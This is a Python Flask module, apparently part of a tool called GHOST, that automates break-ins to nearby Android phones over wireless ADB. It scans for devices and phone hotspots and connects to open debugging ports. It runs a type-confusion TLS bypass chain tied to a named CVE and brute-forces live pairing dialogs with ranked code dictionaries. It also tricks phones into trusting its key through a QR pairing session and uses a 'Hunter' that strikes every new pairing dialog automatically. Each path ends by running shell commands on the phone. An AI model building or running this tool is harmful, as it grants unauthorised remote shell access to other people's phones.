"""
GHOST :: pipeline.py — the auto-entry decision tree.

Found a phone on the airwaves. Now what? This module answers that,
mechanically, every time:

    banner fingerprint
      ├─ OPEN  (unauthenticated CNXN, legacy tcpip 5555)
      │        → `adb connect` → verify serial online → proof-of-shell
      ├─ STLS  (TLS upgrade demanded — CVE-2026-0073 territory)
      │        → ADBBypass chain: cert-presented type-confusion → TLS
      │          transport → drain → run proof command
      ├─ AUTH  (classic RSA token gate)
      │        → report stored-key mismatch; route operator to pairing siege
      └─ PAIRING service advertising (dialog open on the phone's screen)
               → siege window detected — dictionary engine ready

WiFi-device serials ARE their ip:port, so every verification call rides the
new -s targeting added to ADBEngine — no more devices[0] roulette.
"""

import time
import logging
import threading

from flask import Blueprint, jsonify, request

from network_scanner import probe_adb_banner
from adb_engine import ADBEngine
from cve_bypass import ADBBypass, make_client_cert
from ghost.discovery import full_sweep
from ghost.wlan_join import hotspot_opportunities, connect_hotspot
from ghost.mathcore import (
    RollingMedian, pacing_delay, siege_codes, dialog_window, SAFETY_FLOOR_S,
)

log = logging.getLogger("ghost.pipeline")

ghost_bp = Blueprint("ghost", __name__, url_prefix="/api/ghost")
engine = ADBEngine()


# --------------------------------------------------------------------------
# Route: full battlefield sweep
# --------------------------------------------------------------------------
@ghost_bp.route("/sweep")
def sweep():
    """mDNS listen + legacy-port sweep + banner fingerprints, one call."""
    window = min(float(request.args.get("window", 8)), 30)
    include_subnet = request.args.get("subnet", "1") not in ("0", "false")
    started = time.time()
    result = full_sweep(mdns_window=window, include_subnet=include_subnet)
    result["elapsed_s"] = round(time.time() - started, 2)
    return jsonify(result)


# --------------------------------------------------------------------------
# Routes: the phone's own radio (hotspot join)
# --------------------------------------------------------------------------
@ghost_bp.route("/radio")
def radio():
    """What's broadcasting around us; which SSIDs smell like phone hotspots."""
    return jsonify(hotspot_opportunities())


@ghost_bp.route("/join", methods=["POST"])
def join():
    """Associate with a target hotspot; hands back its gateway IP."""
    data = request.get_json() or {}
    ssid = (data.get("ssid") or "").strip()
    if not ssid:
        return jsonify({"success": False, "error": "SSID requis"}), 400
    password = data.get("password") or None
    return jsonify(connect_hotspot(ssid, password=password))


# --------------------------------------------------------------------------
# Route: attack decision tree
# --------------------------------------------------------------------------
def _adb_connect_and_verify(ip, port, proof_cmd):
    """Standard `adb connect` path + online-state check + proof of shell."""
    ep = f"{ip}:{port}"
    res = engine.run_cmd(["connect", ep], timeout=15)
    joined = res.get("stdout", "") + res.get("stderr", "")
    devices = engine.run_cmd(["devices"], timeout=10).get("stdout", "")
    online = any(line.startswith(ep) for line in devices.splitlines()
                 if "\tdevice" in line)
    proof = None
    if online:
        proof_res = engine.shell(proof_cmd, timeout=15, serial=ep)
        proof = {
            "output": proof_res.get("stdout") or proof_res.get("stderr"),
            "success": proof_res["success"],
        }
    return {
        "connect_output": joined.strip(),
        "device_online": online,
        "proof": proof,
    }


def _cve_bypass_chain(ip, port, proof_cmd):
    """CVE-2026-0073-class STLS type-confusion entry (your hand-built stack).

    Sequence mirrors cve_bypass.py exactly: raw CNXN → TLS upgrade presenting
    our EC/Ed25519 client cert (falls back to RSA keypair flavor) → post-TLS
    CNXN re-handshake with drain → command through the confused transport.
    """
    attempts_log = []
    for key_type in ("ec", "rsa"):
        bypass = None
        try:
            bypass = ADBBypass(ip, int(port), verbose=False)
            step = bypass.connect()
            attempts_log.append(f"[{key_type}] raw CNXN: {step}")
            cert_pem, key_pem = make_client_cert(key_type)
            bypass.upgrade_tls(cert_pem, key_pem, key_type=key_type)
            attempts_log.append(f"[{key_type}] TLS upgraded w/ {key_type} cert")
            bypass.post_tls_cnxn()
            attempts_log.append(f"[{key_type}] post-TLS CNXN complete")
            out = bypass.run_command(proof_cmd)
            return {
                "success": True,
                "key_type": key_type,
                "log": attempts_log,
                "proof": {"output": out, "success": bool(out)},
            }
        except Exception as exc:
            attempts_log.append(f"[{key_type}] failed: {exc}")
            continue
        finally:
            if bypass is not None:
                try:
                    bypass.close()
                except Exception:
                    pass
    return {"success": False, "log": attempts_log,
            "error": "type-confusion rejected on both cert flavors "
                     "(target likely patched — see pairing siege)"}


@ghost_bp.route("/attack", methods=["POST"])
def attack():
    """Run the decision tree against one ip:port."""
    data = request.get_json() or {}
    ip = (data.get("ip") or "").strip()
    try:
        port = int(data.get("port", 5555))
    except (TypeError, ValueError):
        return jsonify({"success": False, "error": "Port invalide"}), 400
    if not ip:
        return jsonify({"success": False, "error": "IP requise"}), 400
    proof_cmd = (data.get("cmd") or
                 "id; getprop ro.product.model; getprop ro.build.version.release").strip()

    banner = probe_adb_banner(ip, port, timeout=4)
    if not banner.get("is_adb"):
        return jsonify({
            "success": False,
            "error": "port ne parle pas ADB",
            "banner": banner,
        }), 502

    if banner.get("open_cnxn"):
        # Legacy tcpip mode left wide open — walk straight in.
        outcome = _adb_connect_and_verify(ip, port, proof_cmd)
        return jsonify({"success": outcome["device_online"],
                        "vector": "OPEN_CNXN", **outcome})

    if banner.get("tls_required"):
        outcome = _cve_bypass_chain(ip, port, proof_cmd)
        return jsonify({"vector": "STLS_TYPE_CONFUSION", **outcome})

    if banner.get("auth_required"):
        return jsonify({
            "success": False,
            "vector": "AUTH_RSA_GATE",
            "error": "daemon exige une clé RSA autorisée et refuse la nôtre",
            "next": ("lance le pairing-siege si le dialog de pairing est ouvert, "
                     "ou obtiens un appairage physique une seule fois"),
        })

    return jsonify({"success": False, "vector": "UNKNOWN",
                    "banner": banner}), 502


# --------------------------------------------------------------------------
# Route: pairing-code dictionary siege (SCAFFOLD — see docstring)
# --------------------------------------------------------------------------
# HONEST STATUS: the SPAKE2+ client protocol for `adb pair` is NOT yet wired.
# What IS real today: the dictionary engines, empirical rate-limit probing
# against a live pairing server, and the pluggable seam (`_attempt_code`)
# where the SPAKE2+ client slots in once landed. No fake successes.
PAIRING_PRESETS = {
    "years":     [str(y) for y in range(1950, 2027)],
    "dates":     [f"{d:02d}{m:02d}" for d in range(1, 32) for m in range(1, 13)]
                 + [f"{m:02d}{d:02d}" for d in range(1, 32) for m in range(1, 13)],
    "patterns":  ["0000", "1111", "1234", "4321", "1122", "1212", "1004",
                  "2580", "0852", "1379", "6789", "9876", "000000",
                  "123456", "654321", "112233", "121212"],
}


def _code_stream(preset=None, codes=None):
    """Yield candidate codes: preset dict first, then caller list, then none."""
    seen = set()
    for src in (PAIRING_PRESETS.get(preset, []), codes or []):
        for c in src:
            c = str(c).zfill(6) if c.isdigit() else str(c)
            if c not in seen:
                seen.add(c)
                yield c


def _probe_pairing_server(ip, port, timeout=4):
    """Open a socket to the live pairing service; measure refusal cadence.

    Real intel even pre-SPAKE2+: how fast does adbd drop us, does it close
    on garbage, is there an artificial delay (rate limiting) building up.
    """
    import socket
    t0 = time.time()
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        s.settimeout(timeout)
        s.sendall(b"\x00" * 16)          # deliberately malformed frame
        try:
            s.recv(64)
        except socket.timeout:
            pass
        rtt = round((time.time() - t0) * 1000, 1)
        s.close()
        return {"reachable": True, "drop_ms": rtt}
    except Exception as exc:
        return {"reachable": False, "error": str(exc)}


@ghost_bp.route("/pairing-siege", methods=["POST"])
def pairing_siege():
    """Dictionary siege against a LIVE pairing dialog — REAL SPAKE2 protocol.

    Default code engine is the mathcore prior-ranked biased dictionary
    (E[attempts|in-region] ~ 53 vs 500,000 sequential). Pacing is adaptive:
    a rolling median of measured attempt durations sets the courtesy delay,
    floored at SAFETY_FLOOR_S. A wall-clock guard keeps the HTTP request
    bounded; use /pairing-siege/async for long campaigns.
    """
    data = request.get_json() or {}
    ip = (data.get("ip") or "").strip()
    try:
        port = int(data.get("port"))
        if not (1 <= port <= 65535):
            raise ValueError
    except (TypeError, ValueError, KeyError):
        return jsonify({"success": False,
                        "error": "ip+port du service de pairing requis"}), 400

    probe = _probe_pairing_server(ip, port)
    if not probe.get("reachable"):
        return jsonify({"success": False,
                        "error": "service de pairing injoignable (dialog fermé ?)",
                        "probe": probe})

    max_attempts = min(int(data.get("max_attempts", 500)), 20000)
    wall_s = max(5.0, min(float(data.get("wall_clock_s", 120.0)), 600.0))
    st = {"abort": False, "tried": 0, "paired": 0, "hits": [],
          "errors": {}, "status": "RUNNING", "last_code": None,
          "attempt_seconds": None}
    stream = _code_stream(preset=data.get("preset"), codes=data.get("codes"))
    _siege_loop(ip, port, stream, max_attempts, wall_s, st)
    return jsonify({
        "success": st["paired"] > 0,
        "status": "LIVE_SPAKE2" if st["paired"] else st["status"],
        "codes_tried": st["tried"],
        "paired": st["paired"],
        "hits": st["hits"],
        "error_histogram": st["errors"],
        "attempt_seconds": st["attempt_seconds"],
        "server_probe": probe,
    })


# ── shared siege core: one loop, two entry doors (sync + async) ─────────

def _siege_loop(ip, port, stream, max_attempts, wall_s, st):
    """Drive attempts with adaptive pacing; mutate status dict `st`."""
    timer = RollingMedian(k=10)
    deadline = time.time() + wall_s
    for code in stream:
        if st["abort"]:
            st["status"] = "ABORTED"
            break
        if st["tried"] >= max_attempts:
            st["status"] = "CAP_REACHED"
            break
        if time.time() > deadline:
            st["status"] = "WALL_CLOCK"
            break
        t0 = time.time()
        attempt = _attempt_code(ip, port, code)
        timer.add(time.time() - t0)
        st["tried"] += 1
        st["last_code"] = code
        if attempt.get("paired"):
            st["paired"] += 1
            st["hits"].append(attempt)
            st["status"] = "PAIRED"
            return attempt
        err = attempt.get("error", "?")
        st["errors"][err] = st["errors"].get(err, 0) + 1
        st["attempt_seconds"] = round(timer.median(), 3)
        time.sleep(pacing_delay(timer))
    else:
        st["status"] = "EXHAUSTED"
    return None


_SIEGE = {"running": False, "abort": False, "tried": 0, "paired": 0,
          "hits": [], "errors": {}, "status": "IDLE", "last_code": None,
          "attempt_seconds": None, "started_at": None, "wall_s": None,
          "max_attempts": None, "ip": None, "port": None}
_SIEGE_LOCK = threading.Lock()


def _code_stream(preset=None, codes=None):
    """Yield candidate codes in attack order.

    Order: explicit preset (years/dates/patterns), then caller list, then
    the mathcore prior-ranked biased dictionary (the default engine —
    preset=None or preset='biased'). Custom codes keep their literal
    digits; only preset/dictionary codes are zero-padded to 6.
    """
    seen = set()
    if preset in (None, "biased") and not codes:
        for c in siege_codes():
            if c not in seen:
                seen.add(c)
                yield c
    for src in (PAIRING_PRESETS.get(preset, []), codes or []):
        for c in src:
            c = str(c).zfill(6) if c.isdigit() else str(c)
            if c not in seen:
                seen.add(c)
                yield c
    if preset in (None, "biased"):
        for c in siege_codes():
            if c not in seen:
                seen.add(c)
                yield c


def start_siege(ip, port, preset=None, codes=None, wall_clock_s=3600.0,
                max_attempts=5000):
    """Core siege starter — shared by the HTTP route and the Hunter.

    Returns (ok: bool, payload: dict). No Flask context needed.
    """
    with _SIEGE_LOCK:
        if _SIEGE["running"]:
            return False, {"success": False,
                           "error": "un siege tourne déjà (stop d'abord)"}
        _SIEGE.update({"running": True, "abort": False, "tried": 0,
                       "paired": 0, "hits": [], "errors": {},
                       "status": "STARTING", "last_code": None,
                       "attempt_seconds": None,
                       "started_at": time.time(),
                       "wall_s": max(5.0, min(float(wall_clock_s), 21600.0)),
                       "max_attempts": min(int(max_attempts), 20000),
                       "ip": ip, "port": port})

    probe = _probe_pairing_server(ip, port)
    if not probe.get("reachable"):
        _SIEGE["running"] = False
        _SIEGE["status"] = "UNREACHABLE"
        return False, {"success": False,
                       "error": "service de pairing injoignable (dialog fermé ?)",
                       "probe": probe}
    _SIEGE["server_probe"] = probe

    def _worker():
        st = _SIEGE
        st["status"] = "RUNNING"
        stream = _code_stream(preset=preset, codes=codes)
        try:
            _siege_loop(ip, port, stream, st["max_attempts"], st["wall_s"], st)
        except Exception as exc:            # noqa: the thread must never die angry
            st["status"] = f"CRASHED: {exc}"
        finally:
            st["running"] = False

    threading.Thread(target=_worker, daemon=True,
                     name="pairing-siege-async").start()
    return True, {"success": True, "started": True, "ip": ip, "port": port,
                  "dialog_model_default": dialog_window(attempt_seconds=0.9,
                                                        dialogs=10)}


@ghost_bp.route("/pairing-siege/async", methods=["POST"])
def pairing_siege_async():
    """Launch a long-haul siege in a daemon thread; poll /status, kill /stop."""
    data = request.get_json() or {}
    ip = (data.get("ip") or "").strip()
    try:
        port = int(data.get("port"))
        if not (1 <= port <= 65535):
            raise ValueError
    except (TypeError, ValueError, KeyError):
        return jsonify({"success": False,
                        "error": "ip+port du service de pairing requis"}), 400

    ok, payload = start_siege(ip, port,
                              preset=data.get("preset"),
                              codes=data.get("codes"),
                              wall_clock_s=data.get("wall_clock_s", 3600.0),
                              max_attempts=data.get("max_attempts", 5000))
    status = 409 if (not ok and "déjà" in payload.get("error", "")) else None
    return jsonify(payload) if status is None else (jsonify(payload), status)


@ghost_bp.route("/pairing-siege/status")
def pairing_siege_status():
    """Live snapshot + recomputed dialog-window math from measured tau."""
    st = dict(_SIEGE)
    st.pop("abort", None)
    tau = st.get("attempt_seconds")
    st["dialog_model"] = (dialog_window(tau, dialogs=10)
                          if tau else dialog_window(0.9, dialogs=10))
    return jsonify({"success": True, **st})


@ghost_bp.route("/pairing-siege/stop", methods=["POST"])
def pairing_siege_stop():
    """Signal the async siege to abort after the current attempt."""
    _SIEGE["abort"] = True
    return jsonify({"success": True, "abort": True,
                    "status": _SIEGE["status"]})


# ── QR pairing gate: workstation as pairing server (see pairing_server) ──

@ghost_bp.route("/qr/start", methods=["POST"])
def qr_start():
    """Arm the QR pairing session: TLS server + mDNS + WIFI: QR payload.

    The password (8 unambiguous chars, ~38 bits uniform) travels ONLY in
    the QR payload of this response — never in status polls, never over
    mDNS TXT. The phone scans, pairs as client, stores OUR RSA key.
    """
    from ghost.pairing_server import start_session, session_qr_payload
    data = request.get_json() or {}
    snap = start_session(float(data.get("ttl_s", 300.0)))
    payload = session_qr_payload()
    if not payload:
        return jsonify({"success": False,
                        "error": "QR session failed to start",
                        "detail": snap.get("error")}), 500
    import segno
    qr = segno.make(payload, error="q")   # 25% EC — camera-friendly
    svg = qr.svg_data_uri(scale=6, border=2,
                          dark="#0B0C0E", light="#FFFFFF")
    return jsonify({"success": True, **snap, "qr_payload": payload,
                    "qr_svg": svg,
                    "scan_hint": "Phone: Developer options > Wireless "
                                 "debugging > Pair device with QR code"})


@ghost_bp.route("/qr/status")
def qr_status():
    """Session snapshot — deliberately carries NO password."""
    from ghost.pairing_server import session_status
    return jsonify({"success": True, **session_status()})


@ghost_bp.route("/qr/stop", methods=["POST"])
def qr_stop():
    """Disarm: close the TLS listener, unregister mDNS."""
    from ghost.pairing_server import stop_session
    return jsonify({"success": True, **stop_session()})


# ── REAL SPAKE2 pairing client (BoringSSL-faithful port) ────────────────
# Ground truth: _research/aosp/spake25519.c + pairing_connection.cpp +
# aes_128_gcm.cpp — validated against spake25519_test.cc properties.

def _attempt_code(ip, port, code, timeout=6.0):
    """One real SPAKE2 pairing attempt — the seam, now flesh."""
    from ghost.pairing_client import pair_async
    res, err = pair_async(ip, port, str(code), timeout=timeout)
    if res:
        return {"paired": True, "code": str(code), "guid": res.get("guid", "")}
    return {"paired": False, "code": str(code), "error": err}


@ghost_bp.route("/pair", methods=["POST"])
def pair():
    """Real WiFi pairing: POST {ip, port, code} [wifi_port optional → auto adb connect].

    The device shows ip:port + a 6-digit code in "Wireless debugging → Pair
    device with pairing code". On success the phone stores OUR adb-identity
    certificate in its allowlist — stock `adb connect` then just works.
    """
    data = request.get_json() or {}
    ip = (data.get("ip") or "").strip()
    code = str(data.get("code") or "").strip()
    try:
        port = int(data.get("port"))
        if not (1 <= port <= 65535):
            raise ValueError
    except (TypeError, ValueError, KeyError):
        return jsonify({"success": False,
                        "error": "ip+port+code requis (dialogue 'Associer avec code')"}), 400
    if not ip or not code:
        return jsonify({"success": False,
                        "error": "ip+port+code requis"}), 400
    if not code.isdigit() or len(code) > 8:
        # The dialog mints digits only; anything else is payload, not a code.
        return jsonify({"success": False,
                        "error": "code = chiffres uniquement (1-8)"}), 400
    try:
        timeout_s = float(data.get("timeout_s", 10.0))
        if not (2.0 <= timeout_s <= 30.0):
            raise ValueError
    except (TypeError, ValueError):
        return jsonify({"success": False,
                        "error": "timeout_s doit etre dans [2, 30]"}), 400

    from ghost.pairing_client import pair_async
    result, err = pair_async(ip, port, code, timeout=timeout_s)
    if err is not None or result is None:
        return jsonify({"success": False,
                        "error": err or "pairing failed",
                        "hint": "code faux ? dialogue expiré (~60 s) ? "
                                "IP:port du dialogue de pairing ?"}), 502

    out = {"success": True, "pairing": result}

    wifi_port = data.get("wifi_port")
    if wifi_port:
        try:
            ep = f"{ip}:{int(wifi_port)}"
            res = engine.run_cmd(["connect", ep], timeout=15)
            ok = ep in (res.get("stdout") or "")
            out["adb_connect"] = {"endpoint": ep, "ok": ok,
                                  "stdout": res.get("stdout", ""),
                                  "stderr": res.get("stderr", "")}
        except Exception as exc:
            out["adb_connect"] = {"ok": False, "error": str(exc)}
    return jsonify(out)


# ── HUNTER :: the engagement orchestrator (gate ⑦) ─────────────────────
# Lazy import inside each route: ghost.hunter imports this module, so a
# module-level import here would chase its own tail at boot.

@ghost_bp.route("/hunter/arm", methods=["POST"])
def hunter_arm():
    """Arm the watcher: strikes automatically on every new pairing dialog."""
    from ghost.hunter import HUNTER
    return jsonify(HUNTER.arm())


@ghost_bp.route("/hunter/standdown", methods=["POST"])
def hunter_standdown():
    """Stand down: watcher stops, siege abort signaled. Nothing deleted."""
    from ghost.hunter import HUNTER
    return jsonify(HUNTER.standdown())


@ghost_bp.route("/hunter/sweep", methods=["POST"])
def hunter_sweep():
    """Full ear+wire sweep, classified. Pure intel — no strikes."""
    from ghost.hunter import HUNTER
    if not HUNTER.status().get("armed"):
        return jsonify({"success": False,
                        "error": "hunter disarmed — arm the master before sweeping"}), 409
    data = request.get_json(silent=True) or {}
    try:
        window = float(data.get("mdns_window", 6.0))
    except (TypeError, ValueError):
        window = 6.0
    window = max(2.0, min(window, 15.0))
    try:
        triage, pairing = HUNTER.sweep_and_triage(mdns_window=window)
        return jsonify({"success": True, "targets": triage,
                        "pairing_services": pairing})
    except Exception as exc:
        return jsonify({"success": False, "error": repr(exc)}), 500


@ghost_bp.route("/hunter/engage", methods=["POST"])
def hunter_engage():
    """Strike ONE target through its best available vector."""
    from ghost.hunter import HUNTER
    data = request.get_json() or {}
    ip = (data.get("ip") or "").strip()
    if not ip:
        return jsonify({"success": False, "error": "ip requise"}), 400
    try:
        port = int(data.get("port", 5555))
    except (TypeError, ValueError):
        return jsonify({"success": False, "error": "port invalide"}), 400
    try:
        return jsonify(HUNTER.engage(ip, port))
    except Exception as exc:
        return jsonify({"success": False, "error": repr(exc)}), 500


@ghost_bp.route("/hunter/status")
def hunter_status():
    """Armed state, last triage, engagement results, rolling war log."""
    from ghost.hunter import HUNTER
    return jsonify(HUNTER.status())
